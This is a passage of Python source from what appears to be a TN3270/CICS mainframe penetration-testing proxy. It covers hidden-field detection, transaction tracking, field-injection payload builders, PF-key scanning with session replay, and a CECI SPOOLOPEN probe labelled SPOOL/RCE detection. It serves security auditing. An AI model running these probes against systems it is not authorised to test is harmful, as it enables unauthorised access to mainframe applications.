            dedup_key = '{}:{}'.format(source, message[:100])
        try:
            self.sql_cur.execute(
                "INSERT OR IGNORE INTO Findings (TIMESTAMP, SEVERITY, SOURCE, TXN_CODE, MESSAGE, DEDUP_KEY, CONSTAT) VALUES (?, ?, ?, ?, ?, ?, ?)",
                (str(time.time()), severity, source, txn_code, message, dedup_key, constat))
            self.sql_con.commit()
            return self.sql_cur.rowcount > 0
        except Exception:
            return False

    def all_findings(self, start=0, txn_code=None):
        '''Gets findings from database, optionally filtered by txn_code.'''
        if txn_code:
            self.sql_cur.execute("SELECT * FROM Findings WHERE ID > ? AND TXN_CODE = ? ORDER BY ID", (start, txn_code))
        else:
            self.sql_cur.execute("SELECT * FROM Findings WHERE ID > ? ORDER BY ID", (start,))
        return self.sql_cur.fetchall()

    def get_finding(self, finding_id):
        '''Get a single finding by ID.'''
        self.sql_cur.execute("SELECT * FROM Findings WHERE ID = ?", (finding_id,))
        return self.sql_cur.fetchone()

    def update_finding(self, finding_id, status=None, remediation=None, constat=None):
        '''Update finding status, remediation, and/or constat.'''
        if status is not None:
            if status not in ('NEW', 'CONFIRMED', 'FALSE_POSITIVE'):
                return False
            self.sql_cur.execute("UPDATE Findings SET STATUS = ? WHERE ID = ?", (status, finding_id))
        if remediation is not None:
            self.sql_cur.execute("UPDATE Findings SET REMEDIATION = ? WHERE ID = ?", (remediation, finding_id))
        if constat is not None:
            self.sql_cur.execute("UPDATE Findings SET CONSTAT = ? WHERE ID = ?", (constat, finding_id))
        self.sql_con.commit()
        return True

    # ---- PR2: Screen Map Parsing Methods ----

    def decode_buffer_address(self, b1, b2):
        '''
        Decodes a 3270 buffer address (2 bytes) to row, col.
        Supports both 14-bit and 12-bit addressing.
        Returns (row, col) tuple with 0-based values.
        '''
        # 14-bit addressing
        if b1 & 0xC0 == 0x00:
            address = ((b1 & 0x3F) << 8) | b2
        else:
            # 12-bit addressing (6 bits from each byte)
            address = ((b1 & 0x3F) << 6) | (b2 & 0x3F)

        # Standard 80-column screen
        cols = 80
        row = address // cols
        col = address % cols
        return (row, col)

    def decode_field_attribute(self, attr_byte):
        '''
        Decodes a 3270 field attribute byte into its component flags.
        Returns dict with: protected, numeric, hidden, intensity, modified
        '''
        return {
            'protected': bool(attr_byte & 0x20),
            'numeric': bool(attr_byte & 0x10),
            'hidden': (attr_byte & 0x0C) == 0x0C,
            'intensity': ['normal', 'normal', 'high', 'hidden'][
                (attr_byte & 0x0C) >> 2
            ],
            'modified': bool(attr_byte & 0x01),
        }

    def parse_screen_map(self, server_data):
        '''
        Parses a 3270 data stream and extracts field information.
        Returns list of field dicts with: row, col, type, protected, hidden,
        numeric, content, attr_byte
        '''
        fields = []
        data = server_data

        # Skip telnet data — keep previous screen map
        if len(data) < 2 or data[0] == 0xFF:
            return []

        # Check for TN3270E header (5 bytes)
        offset = 0
        # TN3270E: [data-type=0x00] [request] [response-flag] [seq-hi] [seq-lo]
        if len(data) > 5 and data[0] == 0x00 and data[2] in (0x00, 0x01, 0x02):
            offset = 5

        # Skip write command byte and WCC byte
        if offset + 1 < len(data):
            write_cmd = data[offset]
            # Valid write commands: W(0x01/0xF1), EW(0x05/0xF5), EWA(0x7E/0x6E)
            if write_cmd in (0x01, 0xF1, 0x05, 0xF5, 0x7E, 0x6E):
                offset += 2  # skip cmd + WCC
            else:
                return []  # not a screen update — keep previous map

        i = offset
        current_row = 0
        current_col = 0
        current_content = bytearray()
        current_field = None

        while i < len(data):
            byte = data[i]

            if byte == 0x11 and i + 2 < len(data):  # SBA (Set Buffer Address)
                # Flush content to current field
                if current_field is not None and current_content:
                    current_field['content'] = self.get_ascii(bytes(current_content))
                    current_content = bytearray()

                current_row, current_col = self.decode_buffer_address(data[i+1], data[i+2])
                i += 3
                continue

            elif byte == 0x1D and i + 1 < len(data):  # SF (Start Field)
                # Flush previous field
                if current_field is not None and current_content:
                    current_field['content'] = self.get_ascii(bytes(current_content))
                    current_content = bytearray()

                attr = self.decode_field_attribute(data[i+1])
                field_type = 'protected' if attr['protected'] else 'input'
                current_field = {
                    'row': current_row,
                    'col': current_col,
                    'type': field_type,
                    'protected': attr['protected'],
                    'hidden': attr['hidden'],
                    'numeric': attr['numeric'],
                    'intensity': attr['intensity'],
                    'content': '',
                    'length': 0,
                    'attr_byte': data[i+1],
                }
                fields.append(current_field)
                current_col += 1  # field starts after attr byte
                i += 2
                continue

            elif byte == 0x29 and i + 1 < len(data):  # SFE (Start Field Extended)
                # Flush previous field
                if current_field is not None and current_content:
                    current_field['content'] = self.get_ascii(bytes(current_content))
                    current_content = bytearray()

                pair_count = data[i+1]
                attr_byte = 0x00
                for p in range(pair_count):
                    idx = i + 2 + (p * 2)
                    if idx + 1 < len(data) and data[idx] == 0xC0:
                        attr_byte = data[idx + 1]

                attr = self.decode_field_attribute(attr_byte)
                field_type = 'protected' if attr['protected'] else 'input'
                current_field = {
                    'row': current_row,
                    'col': current_col,
                    'type': field_type,
                    'protected': attr['protected'],
                    'hidden': attr['hidden'],
                    'numeric': attr['numeric'],
                    'intensity': attr['intensity'],
                    'content': '',
                    'length': 0,
                    'attr_byte': attr_byte,
                }
                fields.append(current_field)
                i += 2 + (pair_count * 2)
                current_col += 1
                continue

            elif byte == 0x2C and i + 1 < len(data):  # MF (Modify Field)
                pair_count = data[i+1]
                i += 2 + (pair_count * 2)
                continue

            elif byte == 0x13:  # IC (Insert Cursor)
                i += 1
                continue

            elif byte == 0x05:  # PT (Program Tab)
                i += 1
                continue

            elif byte == 0x0C:  # FF (Form Feed)
                i += 1
                continue

            elif byte == 0x3C:  # RA (Repeat to Address)
                if i + 3 < len(data):
                    i += 4
                else:
                    i += 1
                continue

            elif byte == 0x12:  # EUA (Erase Unprotected to Address)
                if i + 2 < len(data):
                    i += 3
                else:
                    i += 1
                continue

            else:
                # Regular data byte
                current_content.append(byte)
                current_col += 1
                i += 1

        # Flush last field
        if current_field is not None and current_content:
            current_field['content'] = self.get_ascii(bytes(current_content))

        # Calculate lengths
        for f in fields:
            f['length'] = len(f['content'])

        # Assign labels: for input fields, look at preceding protected field text
        for idx, f in enumerate(fields):
            if f['type'] == 'input' and idx > 0:
                prev = fields[idx - 1]
                if prev['type'] == 'protected' and prev['content'].strip():
                    f['label'] = prev['content'].strip()

        # Tag BMS overhead fields
        for f in fields:
            f['bms'] = self._is_bms_overhead(f)

        self.current_screen_map = fields

        # Emit findings for hidden fields (skip BMS overhead)
        for f in fields:
            if f.get('hidden') and not f.get('bms'):
                txn = self.pending_transaction['code'] if self.pending_transaction else None
                label = f.get('label', '')
                content = f.get('content', '')
                constat = "Hidden field '{}' at R{},C{} (len={}, content=\"{}\") on transaction {}.".format(
                    label, f['row'], f['col'], f.get('length', 0), content[:40], txn or 'unknown')
                self.emit_finding('MEDIUM', 'SCREEN_MAP',
                                  'Hidden field at row {} col {} (len={})'.format(f['row'], f['col'], f.get('length', 0)),
                                  txn_code=txn, dedup_key='SCREEN_MAP:hidden:{}:{}'.format(f['row'], f['col']),
                                  constat=constat)

        return fields

    @staticmethod
    def _is_bms_overhead(field):
        '''Detect CICS BMS infrastructure fields (map control, pagination).
        These are hidden fields present on nearly every CICS screen and
        carry no security value for the auditor.'''
        if not field.get('hidden'):
            return False
        length = field.get('length', 0)
        content = field.get('content', '').strip()
        row = field.get('row', -1)
        # Short hidden fields (1-2 bytes) at row 0 — BMS map control
        if row == 0 and length <= 2:
            return True
        # FP/PF pagination indicators — typically last few rows
        if length <= 2 and content in ('FP', 'PF'):
            return True
        return False

    def get_screen_map(self):
        return self.current_screen_map

    # ---- PR3: Transaction Correlation Methods ----

    def detect_transaction_code(self, client_data):
        '''
        Extracts the transaction code from client data.
        After AID byte + cursor address (SBA), read EBCDIC chars until
        next SBA or field mark.
        Returns transaction code string or None.
        '''
        if len(client_data) < 4:
            return None

        # Determine offset based on TN3270 vs TN3270E
        offset = 0
        # TN3270E has 5-byte header
        if len(client_data) > 5 and client_data[0] == 0x00:
            offset = 5

        # AID byte
        aid_byte = client_data[offset]
        offset += 1

        # Check if this is a short-read AID (CLEAR, PA1-3) - no cursor/data
        short_aids = [0x6D, 0x6C, 0x6E, 0x6B]  # CLEAR, PA1, PA2, PA3
        if aid_byte in short_aids:
            return None

        # Skip cursor address (2 bytes)
        if offset + 2 > len(client_data):
            return None
        offset += 2

        # Now check for SBA + buffer address before data
        if offset < len(client_data) and client_data[offset] == 0x11:
            offset += 3  # skip SBA + 2-byte address

        # Read EBCDIC data bytes until next order byte or end
        txn_bytes = bytearray()
        while offset < len(client_data):
            b = client_data[offset]
            # Stop at order bytes or field marks
            if b in (0x11, 0x1D, 0x29, 0x2C, 0x13, 0x1E, 0xFF):
                break
            txn_bytes.append(b)
            offset += 1

        if not txn_bytes:
            return None

        # Convert to ASCII and extract first word (transaction code)
        ascii_text = self.get_ascii(bytes(txn_bytes)).strip()
        # Transaction codes are 1-4 chars typically, max 8
        txn_code = ascii_text.split()[0] if ascii_text.split() else None

        if txn_code and len(txn_code) <= 8 and re.match(r'^[A-Z0-9@#$]+$', txn_code):
            return txn_code
        return None

    def start_transaction(self, txn_code):
        '''Records the start of a transaction'''
        self.pending_transaction = {
            'code': txn_code,
            'timestamp_sent': time.time(),
        }
        self.logger.debug("Transaction started: {}".format(txn_code))

    def complete_transaction(self, server_data):
        '''Completes a pending transaction with server response'''
        if not self.pending_transaction:
            return None

        now = time.time()
        duration_ms = (now - self.pending_transaction['timestamp_sent']) * 1000
        txn = {
            'code': self.pending_transaction['code'],
            'timestamp_sent': self.pending_transaction['timestamp_sent'],
            'timestamp_recv': now,
            'duration_ms': round(duration_ms, 2),
            'response_len': len(server_data),
            'status': 'COMPLETE',
        }
        self.transaction_history.append(txn)
        self.write_transaction_log(txn)
        self.pending_transaction = None
        return txn

    def write_transaction_log(self, txn):
        '''Writes a transaction record to the database'''
        self.sql_cur.execute(
            "INSERT INTO Transactions ('TIMESTAMP_SENT', 'TIMESTAMP_RECV', 'TXN_CODE', 'DURATION_MS', 'RESPONSE_LEN', 'STATUS') VALUES (?, ?, ?, ?, ?, ?)",
            (str(txn['timestamp_sent']), str(txn['timestamp_recv']),
             txn['code'], txn['duration_ms'], txn['response_len'], txn['status'])
        )
        self.sql_con.commit()

    def all_transactions(self, start=0):
        '''Gets all transaction records from database'''
        if start > 0:
            self.sql_cur.execute("SELECT * FROM Transactions WHERE ID > ?", (start,))
        else:
            self.sql_cur.execute("SELECT * FROM Transactions")
        return self.sql_cur.fetchall()

    def get_transaction_stats(self):
        '''Returns summary statistics for transactions'''
        self.sql_cur.execute("SELECT COUNT(*), AVG(DURATION_MS), MIN(DURATION_MS), MAX(DURATION_MS) FROM Transactions")
        row = self.sql_cur.fetchone()
        return {
            'count': row[0] or 0,
            'avg_ms': round(row[1], 2) if row[1] else 0,
            'min_ms': round(row[2], 2) if row[2] else 0,
            'max_ms': round(row[3], 2) if row[3] else 0,
        }

    # ---- PR4: Security Audit Methods ----

    def classify_response(self, server_data):
        '''
        Classifies a server response for security audit purposes.
        Returns status string: ACCESSIBLE, DENIED, ABEND, NOT_FOUND, ERROR, UNKNOWN
        '''
        ascii_text = self.get_ascii(server_data)

        # Check for ABENDs first (reuses PR1 logic)
        abends = self.detect_abend(server_data)
        for a in abends:
            if a['code'] == 'APCT' or a['code'] == 'AEYD':
                return 'NOT_FOUND'
            if a['code'] == 'AEY7' or a['code'] == 'AEYF' or a['code'] == 'AEZD':
                return 'DENIED'
            if a['type'] == 'ABEND':
                return 'ABEND'

        # Check for security violation patterns
        ascii_upper = ascii_text.upper()
        for pattern in SECURITY_VIOLATION_PATTERNS:
            if pattern in ascii_upper:
                return 'DENIED'

        # Check for CICS error messages
        for prefix in CICS_ERROR_PREFIXES:
            if re.search(prefix + r'[0-9]{4}', ascii_text):
                return 'ERROR'

        # Check for common "not found" messages
        not_found_patterns = ['INVALID TRANSACTION', 'UNKNOWN TRANSACTION',
                             'TRANSACTION INVALID', 'UNDEFINED TRANSACTION']
        for p in not_found_patterns:
            if p in ascii_upper:
                return 'NOT_FOUND'

        return 'ACCESSIBLE'

    def build_clear_payload(self, is_tn3270e):
        '''Builds the CLEAR key payload. Pure function — no I/O.'''
        if is_tn3270e:
            return b'\x00\x00\x00\x00\x01\x6d\xff\xef'
        return b'\x6d\xff\xef'

    def build_txn_payload(self, txn_code, is_tn3270e):
        '''Builds a transaction submission payload. Pure function — no I/O.'''
        txn_ebcdic = self.get_ebcdic(txn_code)
        if is_tn3270e:
            return b'\x00\x00\x00\x00\x01\x7d\x5b\x60' + txn_ebcdic + b'\xff\xef'
        return b'\x7d\x5b\x60' + txn_ebcdic + b'\xff\xef'

    def encode_buffer_address(self, row, col):
        '''Encodes row, col to a 2-byte 12-bit SBA address.'''
        address = row * 80 + col
        # 12-bit encoding lookup table (6 bits per byte)
        lookup = [0x40, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
                  0xC8, 0xC9, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
                  0x50, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
                  0xD8, 0xD9, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
                  0x60, 0x61, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
                  0xE8, 0xE9, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
                  0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
                  0xF8, 0xF9, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F]
        b1 = lookup[(address >> 6) & 0x3F]
        b2 = lookup[address & 0x3F]
        return bytes([b1, b2])

    def build_input_payload(self, text, row, col, is_tn3270e, aid=0x7d):
        '''Builds a payload to send text at a specific field position.
        aid: AID byte (default 0x7d = ENTER)'''
        sba = self.encode_buffer_address(row, col)
        text_ebcdic = self.get_ebcdic(text)
        # SBA order byte = 0x11
        payload = bytes([aid]) + b'\x11' + sba + text_ebcdic + b'\xff\xef'
        if is_tn3270e:
            payload = b'\x00\x00\x00\x00\x01' + payload
        return payload

    def build_multi_field_payload(self, fields_with_text, is_tn3270e, aid=0x7d):
        '''Builds one TN3270 payload injecting text into multiple fields.
        fields_with_text: list of (text, row, col) tuples
        Returns: AID + cursor_addr + SBA1+data1 + SBA2+data2 + ... + IAC EOR
        '''
        if not fields_with_text:
            return b''
        # Cursor address = first field position
        first_row, first_col = fields_with_text[0][1], fields_with_text[0][2]
        cursor_addr = self.encode_buffer_address(first_row, first_col)
        body = b''
        for text, row, col in fields_with_text:
            sba = self.encode_buffer_address(row, col)
            text_ebcdic = self.get_ebcdic(text)
            body += b'\x11' + sba + text_ebcdic
        payload = bytes([aid]) + cursor_addr + body + b'\xff\xef'
        if is_tn3270e:
            payload = b'\x00\x00\x00\x00\x01' + payload
        return payload

    # ---- AID Scan (PR5) ----

    def extract_replay_path(self):
        '''Reads client logs from DB, walks back to find the last CLEAR,
        returns list of raw payloads from CLEAR onwards (the navigation path).'''
        self.sql_cur.execute(
            "SELECT ID, RAW_DATA FROM Logs WHERE C_S='C' ORDER BY ID DESC"
        )
        rows = self.sql_cur.fetchall()

        path = []
        for row in rows:
            raw_data = bytes(row[1])
            # Skip empty or negotiation packets
            if len(raw_data) < 3 or raw_data[0] == 0xFF:
                continue
            path.insert(0, raw_data)
            # Check if this packet contains a CLEAR AID
            aid_offset = 5 if (len(raw_data) > 5 and raw_data[0] == 0x00) else 0
            if aid_offset < len(raw_data) and raw_data[aid_offset] == 0x6D:
                break

        return path

    def extract_ref_screen(self):
        '''Gets the last server response from logs as the reference screen.'''
        self.sql_cur.execute(
            "SELECT RAW_DATA FROM Logs WHERE C_S='S' ORDER BY ID DESC LIMIT 1"
        )
        row = self.sql_cur.fetchone()
        if row:
            return bytes(row[0])
        return None

    def screen_similarity(self, data_a, data_b):
        '''Compares two server responses by their ASCII text content.
        Returns similarity ratio 0.0-1.0.'''
        if data_a is None or data_b is None:
            return 0.0
        text_a = self._clean_screen_text(data_a).strip()
        text_b = self._clean_screen_text(data_b).strip()
        if not text_a or not text_b:
            return 0.0
        # Simple character-level similarity (no external deps)
        if text_a == text_b:
            return 1.0
        matches = sum(1 for a, b in zip(text_a, text_b) if a == b)
        max_len = max(len(text_a), len(text_b))
        return matches / max_len if max_len > 0 else 0.0

    def _clean_screen_text(self, raw_data):
        '''Converts EBCDIC data to clean printable ASCII text.'''
        text = self.get_ascii(raw_data)
        text = re.sub(r'\[0x[0-9A-Fa-f]{2}\]', '', text)
        # Keep only printable ASCII (0x20-0x7E)
        return ''.join(c if 0x20 <= ord(c) <= 0x7e else ' ' for c in text)

    def screen_diff(self, data_a, data_b, cols=80):
        '''Compares two server responses by their parsed screen map fields.
        Returns list of {row, ref, got} dicts for fields that differ.'''
        if data_a is None or data_b is None:
            return []
        fields_a = self.parse_screen_map(data_a)
        fields_b = self.parse_screen_map(data_b)
        # Build row→content maps
        map_a = {(f['row'], f['col']): f.get('content', '') for f in fields_a}
        map_b = {(f['row'], f['col']): f.get('content', '') for f in fields_b}
        all_keys = sorted(set(map_a.keys()) | set(map_b.keys()))
        diffs = []
        for key in all_keys:
            ref = map_a.get(key, '')
            got = map_b.get(key, '')
            if ref != got:
                diffs.append({'row': key[0], 'ref': ref.strip(), 'got': got.strip()})
        return diffs

    def aid_scan_categorize(self, server_data, ref_screen):
        '''Categorizes an AID response into SAME_SCREEN, VIOLATION, or NEW_SCREEN.'''
        status = self.classify_response(server_data)
        similarity = self.screen_similarity(server_data, ref_screen)

        if status in ('DENIED', 'ABEND'):
            return ('VIOLATION', status, similarity)
        if similarity > 0.8:
            return ('SAME_SCREEN', status, similarity)
        return ('NEW_SCREEN', status, similarity)

    # Keys with discovery potential only.
    # Excluded: PF3 (exit — known), PA1-3 (attention — rarely mapped).
    # Order: safe (rarely mapped) → interesting (nav/business)
    # Excluded: PF1 (help noise), PF3 (exit), ENTER (submits form), PA1-3 (rarely mapped/exit)
    AID_SCAN_KEYS = [
        'PF13', 'PF14', 'PF15', 'PF16', 'PF17', 'PF18',
        'PF19', 'PF20', 'PF21', 'PF22', 'PF23', 'PF24',
        'PF9', 'PF10', 'PF11', 'PF12',
        'PF7', 'PF8', 'PF4', 'PF5', 'PF6', 'PF2',
    ]

    def build_aid_payload(self, aid_name, is_tn3270e):
        '''Builds a payload to send a bare AID key (no data).'''
        aid_byte = self.AIDS[aid_name]
        # Short-read AIDs (CLEAR, PA1-3) have no cursor address
        short_aids = {b'\x6d', b'\x6c', b'\x6e', b'\x6b'}
        if aid_byte in short_aids:
            payload = aid_byte + b'\xff\xef'
        else:
            # AID + cursor at 0,0 (SBA not needed for bare key)
            payload = aid_byte + b'\x40\x40\xff\xef'
        if is_tn3270e:
            payload = b'\x00\x00\x00\x00\x01' + payload
        return payload

    # ---- Macro Engine ----

    MACRO_ACTIONS = {'CLEAR', 'SEND', 'WAIT', 'AID'}

    def parse_macro(self, file_path):
        '''Load and validate a macro JSON file. Returns (steps, error).'''
        try:
            with open(file_path, 'r') as f:
                data = json.load(f)
        except (json.JSONDecodeError, OSError) as e:
            return None, str(e)
        steps = data if isinstance(data, list) else data.get('steps', [])
        if not isinstance(steps, list) or len(steps) == 0:
            return None, 'Macro must contain a non-empty "steps" list.'
        for i, step in enumerate(steps):
            ok, err = self.validate_macro_step(step)
            if not ok:
                return None, 'Step {}: {}'.format(i, err)
        return steps, None

    def validate_macro_step(self, step):
        '''Validate a single macro step dict. Returns (ok, error_msg).'''
        if not isinstance(step, dict):
            return False, 'Step must be a dict.'
        action = step.get('action', '')
        if action not in self.MACRO_ACTIONS:
            return False, 'Unknown action "{}".'.format(action)
        if action == 'SEND' and not step.get('text'):
            return False, 'SEND requires "text".'
        if action == 'WAIT' and not step.get('text'):
            return False, 'WAIT requires "text".'
        if action == 'AID':
            key = step.get('key', '')
            if key not in self.AIDS:
                return False, 'Unknown AID key "{}".'.format(key)
        return True, None

    def build_macro_step_payload(self, step, is_tn3270e):
        '''Build bytes payload for a SEND/CLEAR/AID step. Pure — no I/O.'''
        action = step['action']
        if action == 'CLEAR':
            return self.build_clear_payload(is_tn3270e)
        if action == 'AID':
            return self.build_aid_payload(step['key'], is_tn3270e)
        if action == 'SEND':
            text = step['text']
            aid_name = step.get('aid', 'ENTER')
            aid_byte = self.AIDS.get(aid_name, b'\x7d')[0]
            row = step.get('row')
            col = step.get('col')
            if row is not None and col is not None:
                return self.build_input_payload(text, int(row), int(col), is_tn3270e, aid=aid_byte)
            return self.build_txn_payload(text, is_tn3270e)
        return b''

    def set_aid_scan_timeout(self, t):
        '''Set AID scan response timeout (clamped 0.5–10s).'''
        self.aid_scan_timeout = max(0.5, min(float(t), 10.0))

    def aid_scan_start(self):
        '''Starts an AID scan from the current screen.
        Extracts replay path and reference screen from logs.'''
        self.aid_scan_replay_path = self.extract_replay_path()
        self.aid_scan_ref_screen = self.extract_ref_screen()
        self.aid_scan_keys = list(self.AID_SCAN_KEYS)
        self.aid_scan_index = 0
        self.aid_scan_results = []
        self.aid_scan_running = True
        self.aid_scan_needs_recovery = False
        # Capture txn code for fast CLEAR+txn recovery (same pattern as fuzzer)
        self.aid_scan_txn_code = None
        try:
            self.sql_cur.execute(
                "SELECT RAW_DATA FROM Logs WHERE C_S='C' ORDER BY ID DESC LIMIT 1")
            row = self.sql_cur.fetchone()
            if row:
                self.aid_scan_txn_code = self.detect_transaction_code(bytes(row[0]))
        except Exception:
            pass
        self.logger.debug("AID scan started, replay path has {} steps, txn_code={}".format(
            len(self.aid_scan_replay_path), self.aid_scan_txn_code))

    def aid_scan_stop(self):
        '''Stops the running AID scan.'''
        self.aid_scan_running = False
        self.logger.debug("AID scan stopped")

    def get_aid_scan_running(self):
        return self.aid_scan_running

    def _aid_scan_send_and_read(self, payload, timeout=2):
        '''Sends a payload and reads server response. Returns raw bytes or None.'''
        self.server.send(payload)
        try:
            rlist, _, _ = select.select([self.server], [], [], timeout)
            if self.server in rlist:
                data = self.server.recv(BUFFER_MAX)
                if len(data) > 0:
                    return data
        except Exception:
            pass
        return None

    def aid_scan_replay(self):
        '''Replays the navigation path to return to the target screen.
        Returns the last server response (should be the target screen).'''
        is_tn3270e = self.check_inject_3270e()
        last_response = None

        # Always start with a CLEAR to reset state
        clear_payload = self.build_clear_payload(is_tn3270e)
        self._aid_scan_send_and_read(clear_payload, timeout=2)
        time.sleep(0.3)

        for step in self.aid_scan_replay_path:
            # Skip the CLEAR that's already in the path (we just sent one)
            step_aid_offset = 5 if (len(step) > 5 and step[0] == 0x00) else 0
            if step_aid_offset < len(step) and step[step_aid_offset] == 0x6D:
                continue
            last_response = self._aid_scan_send_and_read(step, timeout=2)
            time.sleep(0.3)

        return last_response

    def aid_scan_next(self):
        '''Tests the next AID key. Sends it, captures response, then replays path.
        Returns result dict or None if done.'''
        if self.aid_scan_index >= len(self.aid_scan_keys):
            self.aid_scan_running = False
            return None

        aid_name = self.aid_scan_keys[self.aid_scan_index]
        is_tn3270e = self.check_inject_3270e()

        # If previous key left us on a wrong screen, try to recover first
        if self.aid_scan_needs_recovery:
            self.logger.debug("AID scan: pre-recovery before {}...".format(aid_name))
            recovered = self._aid_scan_try_replay(aid_name)
            if not recovered:
                # Can't get back — skip this key and try next
                self.logger.debug("AID scan: pre-recovery failed, skipping {}".format(aid_name))
                result = {
                    'aid_key': aid_name, 'category': 'SKIPPED', 'status': 'SKIPPED',
                    'similarity': 0.0, 'response_preview': 'Skipped — recovery failed',
                    'response_len': 0, 'timestamp': time.time(), 'replay_ok': False,
                }
                self.aid_scan_results.append(result)
                self.write_aid_scan_log(result)
                self.aid_scan_index += 1
                return result
            self.aid_scan_needs_recovery = False

        # Send the AID key
        payload = self.build_aid_payload(aid_name, is_tn3270e)
        self.write_database_log('C', 'AID scan: {}'.format(aid_name), payload)
        server_data = self._aid_scan_send_and_read(payload, timeout=self.aid_scan_timeout)

        result = {
            'aid_key': aid_name,
            'category': 'UNMAPPED',
            'status': 'UNMAPPED',
            'similarity': 0.0,
            'response_preview': '',
            'response_len': 0,
            'timestamp': time.time(),
        }

        if server_data:
            self.client.send(server_data)
            category, status, similarity = self.aid_scan_categorize(
                server_data, self.aid_scan_ref_screen)
            ascii_text = self.get_ascii(server_data)
            preview = re.sub(r'\[0x[0-9A-Fa-f]{2}\]', '', ascii_text).strip()[:200]
            result.update({
                'category': category,
                'status': status,
                'similarity': round(similarity, 3),
                'response_preview': preview,
                'response_len': len(server_data),
            })
            self.write_database_log('S', 'AID scan response: {} -> {}'.format(
                aid_name, category), server_data)

        # Replay path to return to target screen + verify
        replay_ok = self._aid_scan_try_replay(aid_name)

        result['replay_ok'] = replay_ok
        self.aid_scan_results.append(result)
        self.write_aid_scan_log(result)
        self.aid_scan_index += 1

        # Emit finding for interesting AID scan results
        cat = result['category']
        aid_txn = self.aid_scan_txn_code or 'unknown'
        aid_code = self.AIDS.get(aid_name, (0,))[0] if aid_name in self.AIDS else 0
        if cat == 'VIOLATION':
            constat = 'AID key {} (0x{:02X}) on transaction {} triggered security violation.'.format(
                aid_name, aid_code, aid_txn)
            self.emit_finding('HIGH', 'AID_SCAN', '{} triggered security violation'.format(aid_name),
                              txn_code=self.aid_scan_txn_code,
                              dedup_key='AID_SCAN:VIOLATION:{}'.format(aid_name),
                              constat=constat)
        elif cat == 'NEW_SCREEN':
            constat = 'AID key {} (0x{:02X}) on transaction {} navigated to new screen (similarity={:.3f}).'.format(
                aid_name, aid_code, aid_txn, result.get('similarity', 0))
            self.emit_finding('INFO', 'AID_SCAN', '{} navigated to new screen'.format(aid_name),
                              txn_code=self.aid_scan_txn_code,
                              dedup_key='AID_SCAN:NEW_SCREEN:{}'.format(aid_name),
                              constat=constat)

        self.logger.debug("AID scan: {} -> {} (replay: {})".format(
            aid_name, result['category'], 'OK' if replay_ok else 'FAIL'))

        # Replay failed — recovery attempt
        if not replay_ok:
            self.logger.debug("AID scan: recovery attempt after {}...".format(aid_name))
            time.sleep(1.0)
            recovered = self._aid_scan_try_replay(aid_name)
            if recovered:
                self.logger.debug("AID scan: recovered after {} — continuing".format(aid_name))
                self.aid_scan_needs_recovery = False
            else:
                self.logger.debug("AID scan: replay failed after {} — will retry before next key".format(aid_name))
                self.aid_scan_needs_recovery = True

        return result

    def _aid_scan_try_replay(self, aid_name):
        '''Attempts recovery: fast CLEAR+txn first, full replay as fallback.'''
        is_tn3270e = self.check_inject_3270e()

        # Fast path: CLEAR + txn code (2 commands vs N steps)
        if self.aid_scan_txn_code:
            clear_p = self.build_clear_payload(is_tn3270e)
            txn_p = self.build_txn_payload(self.aid_scan_txn_code, is_tn3270e)
            self._aid_scan_send_and_read(clear_p, timeout=self.aid_scan_timeout)
            resp = self._aid_scan_send_and_read(txn_p, timeout=self.aid_scan_timeout)
            if resp:
                sim = self.screen_similarity(resp, self.aid_scan_ref_screen)
                if sim > 0.8:
                    self.client.send(resp)
                    return True
                self.logger.debug("AID scan: fast recovery for {} — similarity {:.0%}, falling back".format(aid_name, sim))

        # Slow path: full replay
        for attempt in range(2):
            replay_response = self.aid_scan_replay()
            if replay_response:
                self.client.send(replay_response)
                sim = self.screen_similarity(replay_response, self.aid_scan_ref_screen)
                if sim > 0.8:
                    return True
                self.logger.debug("AID scan: replay attempt {} for {} — similarity {:.0%}".format(
                    attempt + 1, aid_name, sim))
            else:
                self.logger.debug("AID scan: replay attempt {} for {} — no response".format(
                    attempt + 1, aid_name))
        return False

    def write_aid_scan_log(self, result):
        '''Writes an AID scan result to the database.'''
        self.sql_cur.execute(
            "INSERT INTO AidScan ('TIMESTAMP', 'AID_KEY', 'CATEGORY', 'STATUS', 'SIMILARITY', 'RESPONSE_PREVIEW', 'RESPONSE_LEN', 'REPLAY_OK') VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            (str(result['timestamp']), result['aid_key'], result['category'],
             result['status'], result['similarity'], result['response_preview'],
             result['response_len'], 1 if result.get('replay_ok', True) else 0)
        )
        self.sql_con.commit()

    def all_aid_scan_results(self, start=0):
        '''Gets AID scan results from database.'''
        if start > 0:
            self.sql_cur.execute("SELECT * FROM AidScan WHERE ID > ?", (start,))
        else:
            self.sql_cur.execute("SELECT * FROM AidScan")
        return self.sql_cur.fetchall()

    # ---- SPOOL/RCE Detection ----

    def build_ceci_payload(self, command, is_tn3270e):
        '''Builds a payload to send a CECI command (typed as transaction input).'''
        return self.build_txn_payload(command, is_tn3270e)

    def _spool_send_and_read(self, command, is_tn3270e):
        '''Sends a CECI command and reads response. Returns ASCII text of response.'''
        # CLEAR first
        self.server.send(self.build_clear_payload(is_tn3270e))
        try:
            rlist, _, _ = select.select([self.server], [], [], 0.5)
            if self.server in rlist:
                self.server.recv(BUFFER_MAX)
        except Exception:
            pass

        # Send CECI command
        payload = self.build_ceci_payload(command, is_tn3270e)
        self.write_database_log('C', 'SPOOL: {}'.format(command), payload)
        self.server.send(payload)

        # Read response
        try:
            rlist, _, _ = select.select([self.server], [], [], 3)
            if self.server in rlist:
                server_data = self.server.recv(BUFFER_MAX)
                self.write_database_log('S', 'SPOOL response', server_data)
                return self.get_ascii(server_data), server_data
        except Exception:
            pass
        return '', b''

    def spool_check(self):
        '''Level 1: Passive SPOOL detection.
        Sends SPOOLOPEN then SPOOLCLOSE via CECI. No JCL written.
        Returns dict with status and details.'''
        is_tn3270e = self.check_inject_3270e()

        # Step 1: Try SPOOLOPEN
        open_cmd = 'CECI SPOOLOPEN OUTPUT TOKEN(H3TK)'
        open_text, open_raw = self._spool_send_and_read(open_cmd, is_tn3270e)
        open_upper = open_text.upper()

        result = {
            'command': open_cmd,
